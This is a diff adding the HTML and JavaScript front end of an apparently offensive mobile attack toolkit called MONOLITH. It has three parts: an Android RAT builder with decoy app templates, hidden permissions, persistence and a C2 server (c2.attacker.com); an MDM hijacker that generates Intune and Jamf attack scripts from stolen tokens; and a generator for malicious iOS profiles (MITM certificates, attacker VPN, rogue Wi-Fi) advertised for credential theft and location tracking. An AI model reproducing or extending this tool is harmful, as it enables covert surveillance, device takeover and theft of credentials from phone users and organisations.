@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile & IoT | MONOLITH</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+        
+        * { font-family: 'JetBrains Mono', monospace; }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0f0f1a 100%);
+            min-height: 100vh;
+        }
+        
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        
+        .glass-light {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .neon-green { text-shadow: 0 0 20px rgba(34, 197, 94, 0.8); }
+        .neon-purple { text-shadow: 0 0 20px rgba(168, 85, 247, 0.8); }
+        .neon-cyan { text-shadow: 0 0 20px rgba(34, 211, 238, 0.8); }
+        
+        .gradient-android {
+            background: linear-gradient(135deg, #3ddc84 0%, #00c853 100%);
+        }
+        
+        .gradient-ios {
+            background: linear-gradient(135deg, #5856d6 0%, #007aff 100%);
+        }
+        
+        .gradient-mdm {
+            background: linear-gradient(135deg, #ff6b35 0%, #f7c600 100%);
+        }
+        
+        .pulse-green {
+            animation: pulse-green 2s infinite;
+        }
+        
+        @keyframes pulse-green {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.4); }
+            50% { box-shadow: 0 0 0 15px rgba(34, 197, 94, 0); }
+        }
+        
+        .phone-frame {
+            border: 8px solid #333;
+            border-radius: 30px;
+            background: #1a1a2e;
+            box-shadow: 0 0 30px rgba(0,0,0,0.5);
+        }
+        
+        .scrollbar-hide::-webkit-scrollbar { display: none; }
+        .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
+        
+        pre {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            padding: 16px;
+            overflow-x: auto;
+            font-size: 12px;
+        }
+        
+        .tab-active {
+            background: linear-gradient(135deg, rgba(34, 197, 94, 0.3), rgba(16, 185, 129, 0.2));
+            border-color: rgba(34, 197, 94, 0.5);
+        }
+        
+        .capability-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+</head>
+<body class="text-white p-6">
+    <!-- Header -->
+    <div class="glass rounded-2xl p-6 mb-6">
+        <div class="flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <a href="/" class="text-gray-400 hover:text-white transition-colors">
+                    <i class="fas fa-arrow-left text-xl"></i>
+                </a>
+                <div class="w-16 h-16 gradient-android rounded-xl flex items-center justify-center pulse-green">
+                    <i class="fas fa-mobile-alt text-3xl text-white"></i>
+                </div>
+                <div>
+                    <h1 class="text-3xl font-bold neon-green">Mobile & IoT</h1>
+                    <p class="text-gray-400 mt-1">Cebimizdeki Düşman - Mobil Saldırı Araçları</p>
+                </div>
+            </div>
+            <div class="flex items-center gap-4">
+                <span class="px-4 py-2 bg-green-500/20 text-green-400 rounded-lg text-sm font-bold">
+                    <i class="fab fa-android mr-2"></i>Android
+                </span>
+                <span class="px-4 py-2 bg-blue-500/20 text-blue-400 rounded-lg text-sm font-bold">
+                    <i class="fab fa-apple mr-2"></i>iOS
+                </span>
+                <span class="px-4 py-2 bg-orange-500/20 text-orange-400 rounded-lg text-sm font-bold">
+                    <i class="fas fa-server mr-2"></i>MDM
+                </span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="flex gap-2 mb-6">
+        <button onclick="showTab('ghost')" id="tab-ghost" class="tab-btn px-6 py-3 glass rounded-xl font-medium transition-all hover:bg-white/10 tab-active">
+            <i class="fab fa-android mr-2 text-green-400"></i>Ghost RAT APK
+        </button>
+        <button onclick="showTab('mdm')" id="tab-mdm" class="tab-btn px-6 py-3 glass rounded-xl font-medium transition-all hover:bg-white/10">
+            <i class="fas fa-mobile-screen mr-2 text-orange-400"></i>MDM Hijacker
+        </button>
+        <button onclick="showTab('profiles')" id="tab-profiles" class="tab-btn px-6 py-3 glass rounded-xl font-medium transition-all hover:bg-white/10">
+            <i class="fab fa-apple mr-2 text-blue-400"></i>iOS Profiles
+        </button>
+    </div>
+
+    <!-- Tab Content -->
+    <div id="content-ghost" class="tab-content">
+        <!-- Android Ghost RAT -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- App Template Selection -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-green-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-shapes"></i>
+                    App Template (Decoy)
+                </h2>
+                
+                <div id="app-templates" class="space-y-2 max-h-80 overflow-y-auto scrollbar-hide">
+                    <!-- Templates loaded via JS -->
+                </div>
+            </div>
+
+            <!-- RAT Capabilities -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-purple-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-cogs"></i>
+                    RAT Capabilities
+                </h2>
+                
+                <div id="rat-capabilities" class="space-y-2 max-h-80 overflow-y-auto scrollbar-hide">
+                    <!-- Capabilities loaded via JS -->
+                </div>
+            </div>
+
+            <!-- Phone Preview -->
+            <div class="glass rounded-2xl p-6 flex flex-col items-center">
+                <h2 class="text-xl font-bold text-cyan-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-eye"></i>
+                    Preview
+                </h2>
+                
+                <div class="phone-frame w-48 h-96 p-4 flex flex-col">
+                    <div class="flex justify-center items-center h-8">
+                        <div class="w-20 h-4 bg-black rounded-full"></div>
+                    </div>
+                    <div id="phone-preview" class="flex-1 flex flex-col items-center justify-center">
+                        <div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-gray-700 to-gray-800 flex items-center justify-center mb-2">
+                            <span class="text-3xl">🧮</span>
+                        </div>
+                        <p class="text-xs text-gray-400">Calculator Pro</p>
+                    </div>
+                    <div class="h-1 w-16 bg-white/20 rounded-full mx-auto"></div>
+                </div>
+            </div>
+
+            <!-- C2 Configuration -->
+            <div class="glass rounded-2xl p-6 lg:col-span-2">
+                <h2 class="text-xl font-bold text-yellow-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-satellite-dish"></i>
+                    C2 Configuration
+                </h2>
+                
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">C2 Server URL</label>
+                        <input type="text" id="ghost-c2-url" value="https://c2.attacker.com/api" 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-green-500 focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Beacon Interval (sec)</label>
+                        <input type="number" id="ghost-beacon" value="60" 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-green-500 focus:outline-none">
+                    </div>
+                    <div class="col-span-2">
+                        <label class="flex items-center gap-3 cursor-pointer">
+                            <input type="checkbox" id="ghost-persistence" checked class="w-5 h-5 rounded border-white/20 bg-white/5 text-green-500 focus:ring-green-500/50">
+                            <span class="text-gray-300">Enable Persistence (Boot receiver, JobScheduler, etc.)</span>
+                        </label>
+                    </div>
+                </div>
+                
+                <button onclick="generateApk()" class="w-full mt-4 gradient-android text-white py-3 rounded-xl font-bold hover:opacity-90 transition-all">
+                    <i class="fas fa-hammer mr-2"></i>Generate APK Configuration
+                </button>
+            </div>
+
+            <!-- Generated Output -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-red-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-shield-virus"></i>
+                    Hidden Permissions
+                </h2>
+                <div id="hidden-permissions" class="space-y-1 text-sm">
+                    <p class="text-gray-400">Select capabilities to see required permissions</p>
+                </div>
+            </div>
+
+            <!-- Build Output -->
+            <div class="glass rounded-2xl p-6 lg:col-span-3">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-xl font-bold text-green-400 flex items-center gap-2">
+                        <i class="fas fa-code"></i>
+                        Generated Build Script
+                    </h2>
+                    <div class="flex gap-2">
+                        <button onclick="copyBuildScript()" class="px-4 py-2 bg-green-500/20 text-green-400 rounded-lg text-sm hover:bg-green-500/30 transition-all">
+                            <i class="fas fa-copy mr-2"></i>Copy
+                        </button>
+                        <button onclick="downloadManifest()" class="px-4 py-2 bg-purple-500/20 text-purple-400 rounded-lg text-sm hover:bg-purple-500/30 transition-all">
+                            <i class="fas fa-download mr-2"></i>Manifest
+                        </button>
+                    </div>
+                </div>
+                <pre id="build-output" class="text-green-400 text-sm max-h-64 overflow-y-auto">
+# Select app template and capabilities, then generate APK configuration
+# Output will appear here...
+                </pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="content-mdm" class="tab-content hidden">
+        <!-- MDM Hijacker -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+            <!-- MDM Scanner -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-orange-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-radar"></i>
+                    MDM Panel Scanner
+                </h2>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Target MDM URL</label>
+                        <input type="text" id="mdm-target" value="mdm.company.com" 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-orange-500 focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Platform (optional)</label>
+                        <select id="mdm-platform" class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-orange-500 focus:outline-none">
+                            <option value="">Auto-detect</option>
+                            <option value="intune">Microsoft Intune</option>
+                            <option value="jamf">Jamf Pro</option>
+                            <option value="workspace_one">VMware Workspace ONE</option>
+                            <option value="mobileiron">Ivanti MobileIron</option>
+                            <option value="meraki">Cisco Meraki</option>
+                        </select>
+                    </div>
+                    <button onclick="scanMdm()" class="w-full gradient-mdm text-white py-3 rounded-xl font-bold hover:opacity-90 transition-all">
+                        <i class="fas fa-search mr-2"></i>Scan MDM Panel
+                    </button>
+                </div>
+                
+                <div id="mdm-scan-result" class="mt-4"></div>
+            </div>
+
+            <!-- MDM Platforms Info -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-purple-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-server"></i>
+                    Supported MDM Platforms
+                </h2>
+                
+                <div id="mdm-platforms" class="space-y-3 max-h-80 overflow-y-auto scrollbar-hide">
+                    <!-- Platforms loaded via JS -->
+                </div>
+            </div>
+
+            <!-- Attack Configuration -->
+            <div class="glass rounded-2xl p-6 lg:col-span-2">
+                <h2 class="text-xl font-bold text-red-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-skull-crossbones"></i>
+                    MDM Attack Configuration
+                </h2>
+                
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Attack Type</label>
+                        <select id="mdm-attack-type" class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-red-500 focus:outline-none" onchange="updateMdmAttackForm()">
+                            <option value="intune">Microsoft Intune Attack</option>
+                            <option value="jamf">Jamf Pro Attack</option>
+                        </select>
+                    </div>
+                    <div id="intune-token-field">
+                        <label class="text-gray-400 text-sm block mb-2">Azure AD Access Token</label>
+                        <input type="text" id="intune-token" placeholder="eyJ0eXAiOiJKV1Qi..." 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-red-500 focus:outline-none">
+                    </div>
+                    <div id="jamf-url-field" class="hidden">
+                        <label class="text-gray-400 text-sm block mb-2">Jamf API URL</label>
+                        <input type="text" id="jamf-url" value="https://jamf.company.com:8443" 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-red-500 focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Target Group</label>
+                        <input type="text" id="mdm-target-group" value="All Devices" 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-red-500 focus:outline-none">
+                    </div>
+                </div>
+                
+                <button onclick="generateMdmAttack()" class="w-full bg-red-600 text-white py-3 rounded-xl font-bold hover:bg-red-700 transition-all">
+                    <i class="fas fa-bolt mr-2"></i>Generate Attack Script
+                </button>
+            </div>
+
+            <!-- Attack Output -->
+            <div class="glass rounded-2xl p-6 lg:col-span-2">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-xl font-bold text-orange-400 flex items-center gap-2">
+                        <i class="fas fa-terminal"></i>
+                        Attack Script
+                    </h2>
+                    <button onclick="copyMdmAttack()" class="px-4 py-2 bg-orange-500/20 text-orange-400 rounded-lg text-sm hover:bg-orange-500/30 transition-all">
+                        <i class="fas fa-copy mr-2"></i>Copy
+                    </button>
+                </div>
+                <pre id="mdm-attack-output" class="text-orange-400 text-sm max-h-80 overflow-y-auto">
+# Configure attack parameters and generate
+# PowerShell/curl commands will appear here...
+                </pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="content-profiles" class="tab-content hidden">
+        <!-- iOS Profile Injection -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+            <!-- Profile Types -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-blue-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-file-certificate"></i>
+                    Malicious Profile Types
+                </h2>
+                
+                <div id="profile-types" class="space-y-3 max-h-96 overflow-y-auto scrollbar-hide">
+                    <!-- Profile types loaded via JS -->
+                </div>
+            </div>
+
+            <!-- Profile Generator -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-purple-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-wand-magic-sparkles"></i>
+                    Profile Generator
+                </h2>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Profile Type</label>
+                        <select id="profile-type" class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-purple-500 focus:outline-none">
+                            <option value="ca_certificate">🔐 CA Certificate (MITM)</option>
+                            <option value="vpn_profile">🌐 VPN Profile (Traffic Capture)</option>
+                            <option value="wifi_profile">📶 WiFi Profile (Rogue AP)</option>
+                            <option value="email_profile">📧 Email Profile (Interception)</option>
+                            <option value="mdm_enrollment">📱 MDM Enrollment (Full Control)</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Organization Name</label>
+                        <input type="text" id="profile-org" value="Enterprise Inc." 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-purple-500 focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Attacker VPN Server</label>
+                        <input type="text" id="profile-vpn" value="vpn.attacker.com" 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-purple-500 focus:outline-none">
+                    </div>
+                    <button onclick="generateProfile()" class="w-full gradient-ios text-white py-3 rounded-xl font-bold hover:opacity-90 transition-all">
+                        <i class="fas fa-file-export mr-2"></i>Generate .mobileconfig
+                    </button>
+                </div>
+            </div>
+
+            <!-- Profile Output -->
+            <div class="glass rounded-2xl p-6 lg:col-span-2">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-xl font-bold text-blue-400 flex items-center gap-2">
+                        <i class="fas fa-file-code"></i>
+                        Generated Profile (.mobileconfig)
+                    </h2>
+                    <div class="flex gap-2">
+                        <button onclick="copyProfile()" class="px-4 py-2 bg-blue-500/20 text-blue-400 rounded-lg text-sm hover:bg-blue-500/30 transition-all">
+                            <i class="fas fa-copy mr-2"></i>Copy
+                        </button>
+                        <button onclick="downloadProfile()" class="px-4 py-2 bg-purple-500/20 text-purple-400 rounded-lg text-sm hover:bg-purple-500/30 transition-all">
+                            <i class="fas fa-download mr-2"></i>Download
+                        </button>
+                    </div>
+                </div>
+                <pre id="profile-output" class="text-blue-400 text-sm max-h-80 overflow-y-auto">
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!-- Select profile type and generate --&gt;
+                </pre>
+            </div>
+
+            <!-- Attack Effects -->
+            <div class="glass rounded-2xl p-6 lg:col-span-2">
+                <h2 class="text-xl font-bold text-red-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-radiation"></i>
+                    Attack Effects
+                </h2>
+                <div id="attack-effects" class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="glass-light rounded-xl p-4 text-center">
+                        <i class="fas fa-lock-open text-4xl text-red-400 mb-2"></i>
+                        <p class="font-medium">HTTPS Decryption</p>
+                        <p class="text-xs text-gray-400">All secure traffic visible</p>
+                    </div>
+                    <div class="glass-light rounded-xl p-4 text-center">
+                        <i class="fas fa-key text-4xl text-yellow-400 mb-2"></i>
+                        <p class="font-medium">Credential Theft</p>
+                        <p class="text-xs text-gray-400">Capture all logins</p>
+                    </div>
+                    <div class="glass-light rounded-xl p-4 text-center">
+                        <i class="fas fa-map-marker-alt text-4xl text-green-400 mb-2"></i>
+                        <p class="font-medium">Location Tracking</p>
+                        <p class="text-xs text-gray-400">Real-time GPS data</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let selectedTemplate = 'calculator';
+        let selectedCapabilities = ['sms_read', 'location'];
+        let currentBuildScript = '';
+        let currentManifest = '';
+        let currentMdmAttack = '';
+        let currentProfile = '';
+        let appTemplates = {};
+        let ratCapabilities = {};
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            loadAppTemplates();
+            loadRatCapabilities();
+            loadMdmPlatforms();
+            loadProfileTypes();
+        });
+
+        function showTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('tab-active'));
+            
+            document.getElementById('content-' + tabName).classList.remove('hidden');
+            document.getElementById('tab-' + tabName).classList.add('tab-active');
+        }
+
+        async function loadAppTemplates() {
+            try {
+                const response = await fetch('/mobile-iot/api/app-templates');
+                const data = await response.json();
+                
+                if (data.success) {
+                    appTemplates = data.templates;
+                    const container = document.getElementById('app-templates');
+                    
+                    container.innerHTML = Object.entries(data.templates).map(([key, app]) => `
+                        <div class="glass-light rounded-xl p-3 cursor-pointer hover:bg-white/10 transition-all capability-card ${key === selectedTemplate ? 'border-green-500 bg-green-500/10' : ''}"
+                             onclick="selectTemplate('${key}')">
+                            <div class="flex items-center gap-3">
+                                <span class="text-2xl">${app.icon}</span>
+                                <div>
+                                    <p class="font-medium text-sm">${app.name}</p>
+                                    <p class="text-xs text-gray-400">${app.package}</p>
+                                </div>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            } catch (error) {
+                console.error('Error loading templates:', error);
+            }
+        }
+
+        async function loadRatCapabilities() {
+            try {
+                const response = await fetch('/mobile-iot/api/rat-capabilities');
+                const data = await response.json();
+                
+                if (data.success) {
+                    ratCapabilities = data.capabilities;
+                    const container = document.getElementById('rat-capabilities');
+                    
+                    container.innerHTML = Object.entries(data.capabilities).map(([key, cap]) => `
+                        <label class="glass-light rounded-xl p-3 cursor-pointer hover:bg-white/10 transition-all capability-card flex items-center gap-3">
+                            <input type="checkbox" id="cap-${key}" ${selectedCapabilities.includes(key) ? 'checked' : ''} 
+                                   onchange="toggleCapability('${key}')"
+                                   class="w-4 h-4 rounded border-white/20 bg-white/5 text-green-500 focus:ring-green-500/50">
+                            <div class="flex-1">
+                                <p class="font-medium text-sm">${cap.name}</p>
+                                <p class="text-xs text-gray-400">${cap.description}</p>
+                            </div>
+                            <span class="text-xs px-2 py-1 rounded ${cap.risk === 'CRITICAL' ? 'bg-red-500/20 text-red-400' : cap.risk === 'HIGH' ? 'bg-orange-500/20 text-orange-400' : 'bg-yellow-500/20 text-yellow-400'}">${cap.risk}</span>
+                        </label>
+                    `).join('');
+                    
+                    updateHiddenPermissions();
+                }
+            } catch (error) {
+                console.error('Error loading capabilities:', error);
+            }
+        }
+
+        function selectTemplate(key) {
+            selectedTemplate = key;
+            loadAppTemplates(); // Refresh to show selection
+            updatePhonePreview();
+        }
+
+        function toggleCapability(key) {
+            const index = selectedCapabilities.indexOf(key);
+            if (index > -1) {
+                selectedCapabilities.splice(index, 1);
+            } else {
+                selectedCapabilities.push(key);
+            }
+            updateHiddenPermissions();
+        }
+
+        function updatePhonePreview() {
+            const app = appTemplates[selectedTemplate];
+            if (app) {
+                document.getElementById('phone-preview').innerHTML = `
+                    <div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-gray-700 to-gray-800 flex items-center justify-center mb-2">
+                        <span class="text-3xl">${app.icon}</span>
+                    </div>
+                    <p class="text-xs text-gray-400">${app.name}</p>
+                `;
+            }
+        }
+
+        function updateHiddenPermissions() {
+            const container = document.getElementById('hidden-permissions');
+            const permissions = selectedCapabilities.map(cap => ratCapabilities[cap]?.permission).filter(Boolean);
+            
+            if (permissions.length > 0) {
+                container.innerHTML = permissions.map(perm => `
+                    <p class="text-red-400 text-xs">• ${perm}</p>
+                `).join('');
+            } else {
+                container.innerHTML = '<p class="text-gray-400">Select capabilities to see required permissions</p>';
+            }
+        }
+
+        async function generateApk() {
+            const c2Url = document.getElementById('ghost-c2-url').value;
+            const persistence = document.getElementById('ghost-persistence').checked;
+            
+            try {
+                const response = await fetch('/mobile-iot/api/generate-apk', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        template: selectedTemplate,
+                        capabilities: selectedCapabilities,
+                        c2_url: c2Url,
+                        persistence: persistence
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentBuildScript = data.config.build_script;
+                    currentManifest = data.config.manifest;
+                    document.getElementById('build-output').textContent = currentBuildScript;
+                }
+            } catch (error) {
+                document.getElementById('build-output').textContent = 'Error: ' + error.message;
+            }
+        }
+
+        function copyBuildScript() {
+            navigator.clipboard.writeText(currentBuildScript);
+            alert('Build script copied!');
+        }
+
+        function downloadManifest() {
+            const blob = new Blob([currentManifest], { type: 'text/xml' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'AndroidManifest.xml';
+            a.click();
+        }
+
+        async function loadMdmPlatforms() {
+            try {
+                const response = await fetch('/mobile-iot/api/mdm-platforms');
+                const data = await response.json();
+                
+                if (data.success) {
+                    const container = document.getElementById('mdm-platforms');
+                    container.innerHTML = Object.entries(data.platforms).map(([key, platform]) => `
+                        <div class="glass-light rounded-xl p-3">
+                            <div class="flex items-center justify-between mb-2">
+                                <h4 class="font-bold text-sm">${platform.name}</h4>
+                                <span class="text-xs text-gray-400">${platform.vendor}</span>
+                            </div>
+                            <p class="text-xs text-gray-400 mb-2">Auth: ${platform.auth_type}</p>
+                            <div class="flex flex-wrap gap-1">
+                                ${platform.features.map(f => `<span class="text-xs px-2 py-0.5 bg-white/10 rounded">${f}</span>`).join('')}
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            } catch (error) {
+                console.error('Error loading MDM platforms:', error);
+            }
+        }
+
+        async function scanMdm() {
+            const target = document.getElementById('mdm-target').value;
+            const platform = document.getElementById('mdm-platform').value;
+            
+            const container = document.getElementById('mdm-scan-result');
+            container.innerHTML = '<div class="text-center py-4"><i class="fas fa-spinner fa-spin text-orange-400 text-2xl"></i></div>';
+            
+            try {
+                const response = await fetch('/mobile-iot/api/scan-mdm', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target: target, platform: platform || null })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    const r = data.scan_result;
+                    container.innerHTML = `
+                        <div class="glass-light rounded-xl p-4 space-y-2 text-sm">
+                            <div class="flex justify-between"><span class="text-gray-400">Platform:</span><span class="text-orange-400">${r.detected_platform}</span></div>
+                            <div class="flex justify-between"><span class="text-gray-400">Vendor:</span><span class="text-white">${r.vendor}</span></div>
+                            <div class="flex justify-between"><span class="text-gray-400">Enrolled Devices:</span><span class="text-green-400">${r.enrolled_devices}</span></div>
+                            <div class="flex justify-between"><span class="text-gray-400">API Accessible:</span><span class="${r.api_accessible ? 'text-green-400' : 'text-red-400'}">${r.api_accessible ? 'Yes' : 'No'}</span></div>
+                            ${r.vulnerabilities.length > 0 ? `
+                                <div class="mt-2 bg-red-500/20 rounded-lg p-2">
+                                    <p class="text-red-400 font-bold mb-1">⚠️ Vulnerabilities:</p>
+                                    ${r.vulnerabilities.map(v => `<p class="text-xs text-red-300">• ${v.name} (${v.severity})</p>`).join('')}
+                                </div>
+                            ` : ''}
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                container.innerHTML = '<p class="text-red-400">Scan failed: ' + error.message + '</p>';
+            }
+        }
+
+        function updateMdmAttackForm() {
+            const type = document.getElementById('mdm-attack-type').value;
+            document.getElementById('intune-token-field').classList.toggle('hidden', type !== 'intune');
+            document.getElementById('jamf-url-field').classList.toggle('hidden', type !== 'jamf');
+        }
+
+        async function generateMdmAttack() {
+            const type = document.getElementById('mdm-attack-type').value;
+            
+            let endpoint, body;
+            if (type === 'intune') {
+                endpoint = '/mobile-iot/api/intune-attack';
+                body = {
+                    access_token: document.getElementById('intune-token').value,
+                    target_group: document.getElementById('mdm-target-group').value
+                };
+            } else {
+                endpoint = '/mobile-iot/api/jamf-attack';
+                body = {
+                    api_url: document.getElementById('jamf-url').value
+                };
+            }
+            
+            try {
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentMdmAttack = data.attack_config.powershell_script || data.attack_config.curl_commands;
+                    document.getElementById('mdm-attack-output').textContent = currentMdmAttack;
+                }
+            } catch (error) {
+                document.getElementById('mdm-attack-output').textContent = 'Error: ' + error.message;
+            }
+        }
+
+        function copyMdmAttack() {
+            navigator.clipboard.writeText(currentMdmAttack);
+            alert('Attack script copied!');
+        }
+
+        async function loadProfileTypes() {
+            try {
+                const response = await fetch('/mobile-iot/api/profile-types');
+                const data = await response.json();
+                
+                if (data.success) {
+                    const container = document.getElementById('profile-types');
+                    container.innerHTML = Object.entries(data.profiles).map(([key, profile]) => `
+                        <div class="glass-light rounded-xl p-4">
+                            <div class="flex items-center justify-between mb-2">
+                                <h4 class="font-bold text-sm text-blue-400">${profile.name}</h4>
+                                <span class="text-xs px-2 py-1 rounded ${profile.risk === 'CRITICAL' ? 'bg-red-500/20 text-red-400' : 'bg-orange-500/20 text-orange-400'}">${profile.risk}</span>
+                            </div>
+                            <p class="text-xs text-gray-400 mb-2">${profile.description}</p>
+                            <div class="text-xs text-red-300">
+                                ${profile.effects.slice(0, 2).map(e => `<p>• ${e}</p>`).join('')}
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            } catch (error) {
+                console.error('Error loading profile types:', error);
+            }
+        }
+
+        async function generateProfile() {
+            const profileType = document.getElementById('profile-type').value;
+            const orgName = document.getElementById('profile-org').value;
+            const vpnServer = document.getElementById('profile-vpn').value;
+            
+            try {
+                const response = await fetch('/mobile-iot/api/generate-profile', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        profile_type: profileType,
+                        org_name: orgName,
+                        vpn_server: vpnServer
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentProfile = data.profile.mobileconfig;
+                    document.getElementById('profile-output').textContent = currentProfile;
+                }
+            } catch (error) {
+                document.getElementById('profile-output').textContent = 'Error: ' + error.message;
+            }
+        }
+
+        function copyProfile() {
+            navigator.clipboard.writeText(currentProfile);
+            alert('Profile copied!');
+        }
+
+        function downloadProfile() {
+            const blob = new Blob([currentProfile], { type: 'application/x-apple-aspen-config' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'enterprise.mobileconfig';
+            a.click();
+        }
+    </script>
+</body>
+</html>
